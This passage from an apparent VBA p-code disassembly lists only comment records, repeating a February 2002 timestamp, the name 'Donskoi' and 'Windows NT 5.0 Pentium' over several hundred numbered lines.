' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5255:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5256:
' Line #5257:
' Line #5258:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:27:32"
' Line #5259:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5260:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5261:
' Line #5262:
' Line #5263:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:28:46"
' Line #5264:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5265:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5266:
' Line #5267:
' Line #5268:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:28:56"
' Line #5269:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5270:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5271:
' Line #5272:
' Line #5273:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:37:31"
' Line #5274:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5275:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5276:
' Line #5277:
' Line #5278:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:39:03"
' Line #5279:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5280:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5281:
' Line #5282:
' Line #5283:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:40:01"
' Line #5284:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5285:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5286:
' Line #5287:
' Line #5288:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:40:36"
' Line #5289:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5290:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5291:
' Line #5292:
' Line #5293:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:40:46"
' Line #5294:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5295:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5296:
' Line #5297:
' Line #5298:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:41:06"
' Line #5299:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5300:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5301:
' Line #5302:
' Line #5303:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:41:14"
' Line #5304:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5305:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5306:
' Line #5307:
' Line #5308:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:41:21"
' Line #5309:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5310:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5311:
' Line #5312:
' Line #5313:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:44:28"
' Line #5314:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5315:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5316:
' Line #5317:
' Line #5318:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:45:03"
' Line #5319:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5320:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5321:
' Line #5322:
' Line #5323:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:45:15"
' Line #5324:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5325:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5326:
' Line #5327:
' Line #5328:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:46:02"
' Line #5329:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5330:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5331:
' Line #5332:
' Line #5333:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:46:19"
' Line #5334:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5335:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5336:
' Line #5337:
' Line #5338:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:47:54"
' Line #5339:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5340:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5341:
' Line #5342:
' Line #5343:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:48:03"
' Line #5344:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5345:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5346:
' Line #5347:
' Line #5348:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:54:08"
' Line #5349:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5350:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5351:
' Line #5352:
' Line #5353:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:54:28"
' Line #5354:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5355:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5356:
' Line #5357:
' Line #5358:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:55:06"
' Line #5359:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5360:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5361:
' Line #5362:
' Line #5363:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:55:40"
' Line #5364:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5365:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5366:
' Line #5367:
' Line #5368:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:56:30"
' Line #5369:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5370:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5371:
' Line #5372:
' Line #5373:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:57:07"
' Line #5374:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5375:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5376:
' Line #5377:
' Line #5378:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:58:02"
' Line #5379:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5380:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5381:
' Line #5382:
' Line #5383:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:58:23"
' Line #5384:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5385:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5386:
' Line #5387:
' Line #5388:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 3:59:44"
' Line #5389:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5390:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5391:
' Line #5392:
' Line #5393:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:00:19"
' Line #5394:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5395:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5396:
' Line #5397:
' Line #5398:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:00:54"
' Line #5399:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5400:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5401:
' Line #5402:
' Line #5403:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:04:09"
' Line #5404:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5405:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5406:
' Line #5407:
' Line #5408:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:04:22"
' Line #5409:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5410:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5411:
' Line #5412:
' Line #5413:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:04:43"
' Line #5414:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5415:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5416:
' Line #5417:
' Line #5418:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:05:30"
' Line #5419:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5420:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5421:
' Line #5422:
' Line #5423:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:05:49"
' Line #5424:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5425:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5426:
' Line #5427:
' Line #5428:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:06:01"
' Line #5429:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5430:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5431:
' Line #5432:
' Line #5433:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:06:16"
' Line #5434:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5435:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5436:
' Line #5437:
' Line #5438:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:07:52"
' Line #5439:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5440:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5441:
' Line #5442:
' Line #5443:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:08:49"
' Line #5444:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5445:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5446:
' Line #5447:
' Line #5448:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:09:28"
' Line #5449:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5450:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5451:
' Line #5452:
' Line #5453:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:10:15"
' Line #5454:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5455:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5456:
' Line #5457:
' Line #5458:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:10:26"
' Line #5459:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5460:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5461:
' Line #5462:
' Line #5463:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:11:22"
' Line #5464:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5465:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5466:
' Line #5467:
' Line #5468:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:12:10"
' Line #5469:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5470:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5471:
' Line #5472:
' Line #5473:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:13:57"
' Line #5474:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5475:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5476:
' Line #5477:
' Line #5478:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:13:59"
' Line #5479:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5480:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5481:
' Line #5482:
' Line #5483:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:15:25"
' Line #5484:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5485:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5486:
' Line #5487:
' Line #5488:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:15:26"
' Line #5489:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5490:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5491:
' Line #5492:
' Line #5493:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:18:22"
' Line #5494:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5495:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5496:
' Line #5497:
' Line #5498:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:19:11"
' Line #5499:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5500:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5501:
' Line #5502:
' Line #5503:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:25:38"
' Line #5504:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5505:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5506:
' Line #5507:
' Line #5508:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:28:11"
' Line #5509:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5510:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5511:
' Line #5512:
' Line #5513:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:29:00"
' Line #5514:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5515:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5516:
' Line #5517:
' Line #5518:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:29:07"
' Line #5519:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5520:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5521:
' Line #5522:
' Line #5523:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:30:00"
' Line #5524:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5525:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5526:
' Line #5527:
' Line #5528:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:30:20"
' Line #5529:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5530:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5531:
' Line #5532:
' Line #5533:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:30:33"
' Line #5534:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5535:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5536:
' Line #5537:
' Line #5538:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:30:42"
' Line #5539:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5540:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5541:
' Line #5542:
' Line #5543:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:31:03"
' Line #5544:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5545:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5546:
' Line #5547:
' Line #5548:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:31:15"
' Line #5549:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5550:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5551:
' Line #5552:
' Line #5553:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:31:28"
' Line #5554:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5555:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5556:
' Line #5557:
' Line #5558:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:31:48"
' Line #5559:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5560:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5561:
' Line #5562:
' Line #5563:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:31:55"
' Line #5564:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5565:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5566:
' Line #5567:
' Line #5568:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:32:21"
' Line #5569:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5570:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5571:
' Line #5572:
' Line #5573:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:32:30"
' Line #5574:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5575:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5576:
' Line #5577:
' Line #5578:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:32:40"
' Line #5579:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5580:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5581:
' Line #5582:
' Line #5583:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:34:23"
' Line #5584:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5585:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5586:
' Line #5587:
' Line #5588:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:35:56"
' Line #5589:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5590:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5591:
' Line #5592:
' Line #5593:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:37:11"
' Line #5594:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5595:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5596:
' Line #5597:
' Line #5598:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:37:45"
' Line #5599:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5600:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5601:
' Line #5602:
' Line #5603:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:38:15"
' Line #5604:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5605:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5606:
' Line #5607:
' Line #5608:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:38:50"
' Line #5609:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5610:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5611:
' Line #5612:
' Line #5613:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:39:28"
' Line #5614:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5615:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5616:
' Line #5617:
' Line #5618:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:40:08"
' Line #5619:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5620:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5621:
' Line #5622:
' Line #5623:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:41:03"
' Line #5624:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5625:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5626:
' Line #5627:
' Line #5628:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:41:11"
' Line #5629:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5630:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5631:
' Line #5632:
' Line #5633:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:41:23"
' Line #5634:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5635:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5636:
' Line #5637:
' Line #5638:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:41:32"
' Line #5639:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5640:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5641:
' Line #5642:
' Line #5643:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:44:06"
' Line #5644:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5645:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5646:
' Line #5647:
' Line #5648:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:44:27"
' Line #5649:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5650:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5651:
' Line #5652:
' Line #5653:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:45:32"
' Line #5654:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5655:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5656:
' Line #5657:
' Line #5658:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:46:00"
' Line #5659:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5660:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5661:
' Line #5662:
' Line #5663:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:46:36"
' Line #5664:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5665:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5666:
' Line #5667:
' Line #5668:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:48:14"
' Line #5669:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5670:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5671:
' Line #5672:
' Line #5673:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:48:28"
' Line #5674:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5675:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5676:
' Line #5677:
' Line #5678:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:48:46"
' Line #5679:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5680:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5681:
' Line #5682:
' Line #5683:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:52:37"
' Line #5684:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5685:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5686:
' Line #5687:
' Line #5688:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:52:53"
' Line #5689:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5690:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5691:
' Line #5692:
' Line #5693:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:53:12"
' Line #5694:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5695:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5696:
' Line #5697:
' Line #5698:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:53:43"
' Line #5699:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5700:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5701:
' Line #5702:
' Line #5703:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:53:57"
' Line #5704:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5705:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5706:
' Line #5707:
' Line #5708:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:54:29"
' Line #5709:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5710:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5711:
' Line #5712:
' Line #5713:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:54:52"
' Line #5714:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5715:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5716:
' Line #5717:
' Line #5718:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:55:13"
' Line #5719:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5720:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5721:
' Line #5722:
' Line #5723:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:55:23"
' Line #5724:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5725:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5726:
' Line #5727:
' Line #5728:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:55:49"
' Line #5729:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5730:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5731:
' Line #5732:
' Line #5733:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:56:25"
' Line #5734:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5735:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5736:
' Line #5737:
' Line #5738:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:57:13"
' Line #5739:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5740:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5741:
' Line #5742:
' Line #5743:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:57:47"
' Line #5744:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5745:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5746:
' Line #5747:
' Line #5748:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 4:59:43"
' Line #5749:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5750:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5751:
' Line #5752:
' Line #5753:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:05:56"
' Line #5754:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5755:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5756:
' Line #5757:
' Line #5758:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:06:20"
' Line #5759:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5760:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5761:
' Line #5762:
' Line #5763:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:06:37"
' Line #5764:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5765:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5766:
' Line #5767:
' Line #5768:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:16:00"
' Line #5769:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5770:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5771:
' Line #5772:
' Line #5773:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:16:11"
' Line #5774:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5775:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5776:
' Line #5777:
' Line #5778:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:16:13"
' Line #5779:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5780:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5781:
' Line #5782:
' Line #5783:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:16:36"
' Line #5784:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5785:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5786:
' Line #5787:
' Line #5788:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:17:59"
' Line #5789:
